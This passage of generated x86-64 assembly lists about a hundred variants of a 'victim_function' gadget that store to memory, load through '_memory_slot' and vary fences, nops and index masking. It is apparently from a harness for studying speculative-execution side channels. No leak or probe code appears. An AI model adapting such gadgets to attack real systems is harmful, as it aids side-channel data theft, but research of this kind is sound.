.Lvictim_function_win0_var833:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 834
.Lvictim_function_win0_var834:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 835
.Lvictim_function_win0_var835:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 836
.Lvictim_function_win0_var836:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 837
.Lvictim_function_win0_var837:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 838
.Lvictim_function_win0_var838:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	nop
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 839
.Lvictim_function_win0_var839:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 840
.Lvictim_function_win0_var840:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 841
.Lvictim_function_win0_var841:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 842
.Lvictim_function_win0_var842:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 843
.Lvictim_function_win0_var843:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 844
.Lvictim_function_win0_var844:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 845
.Lvictim_function_win0_var845:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 846
.Lvictim_function_win0_var846:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 847
.Lvictim_function_win0_var847:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 848
.Lvictim_function_win0_var848:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 849
.Lvictim_function_win0_var849:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 850
.Lvictim_function_win0_var850:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 851
.Lvictim_function_win0_var851:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 852
.Lvictim_function_win0_var852:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 853
.Lvictim_function_win0_var853:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 854
.Lvictim_function_win0_var854:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 855
.Lvictim_function_win0_var855:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 856
.Lvictim_function_win0_var856:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 857
.Lvictim_function_win0_var857:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 858
.Lvictim_function_win0_var858:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 859
.Lvictim_function_win0_var859:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 860
.Lvictim_function_win0_var860:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 861
.Lvictim_function_win0_var861:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 862
.Lvictim_function_win0_var862:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 863
.Lvictim_function_win0_var863:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 864
.Lvictim_function_win0_var864:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 865
.Lvictim_function_win0_var865:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 866
.Lvictim_function_win0_var866:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 867
.Lvictim_function_win0_var867:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 868
.Lvictim_function_win0_var868:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 869
.Lvictim_function_win0_var869:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 870
.Lvictim_function_win0_var870:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 871
.Lvictim_function_win0_var871:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 872
.Lvictim_function_win0_var872:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 873
.Lvictim_function_win0_var873:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 874
.Lvictim_function_win0_var874:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 875
.Lvictim_function_win0_var875:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 876
.Lvictim_function_win0_var876:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 877
.Lvictim_function_win0_var877:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 878
.Lvictim_function_win0_var878:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 879
.Lvictim_function_win0_var879:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 880
.Lvictim_function_win0_var880:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 881
.Lvictim_function_win0_var881:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 882
.Lvictim_function_win0_var882:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 883
.Lvictim_function_win0_var883:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 884
.Lvictim_function_win0_var884:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 885
.Lvictim_function_win0_var885:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 886
.Lvictim_function_win0_var886:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 887
.Lvictim_function_win0_var887:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 888
.Lvictim_function_win0_var888:
	popq	%rax
	nop
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 889
.Lvictim_function_win0_var889:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 890
.Lvictim_function_win0_var890:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 891
.Lvictim_function_win0_var891:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 892
.Lvictim_function_win0_var892:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 893
.Lvictim_function_win0_var893:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 894
.Lvictim_function_win0_var894:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 895
.Lvictim_function_win0_var895:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 896
.Lvictim_function_win0_var896:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 897
.Lvictim_function_win0_var897:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 898
.Lvictim_function_win0_var898:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 899
.Lvictim_function_win0_var899:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 900
.Lvictim_function_win0_var900:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 901
.Lvictim_function_win0_var901:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 902
.Lvictim_function_win0_var902:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 903
.Lvictim_function_win0_var903:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 904
.Lvictim_function_win0_var904:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 905
.Lvictim_function_win0_var905:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 906
.Lvictim_function_win0_var906:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 907
.Lvictim_function_win0_var907:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 908
.Lvictim_function_win0_var908:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 909
.Lvictim_function_win0_var909:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 910
.Lvictim_function_win0_var910:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 911
.Lvictim_function_win0_var911:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 912
.Lvictim_function_win0_var912:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 913
.Lvictim_function_win0_var913:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 914
.Lvictim_function_win0_var914:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 915
.Lvictim_function_win0_var915:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 916
.Lvictim_function_win0_var916:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 917
.Lvictim_function_win0_var917:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 918
.Lvictim_function_win0_var918:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 919
.Lvictim_function_win0_var919:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 920
.Lvictim_function_win0_var920:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 921
.Lvictim_function_win0_var921:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 922
.Lvictim_function_win0_var922:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 923
.Lvictim_function_win0_var923:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 924
.Lvictim_function_win0_var924:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 925
.Lvictim_function_win0_var925:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 926
.Lvictim_function_win0_var926:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 927
.Lvictim_function_win0_var927:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 928
.Lvictim_function_win0_var928:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 929
.Lvictim_function_win0_var929:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 930
.Lvictim_function_win0_var930:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 931
.Lvictim_function_win0_var931:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
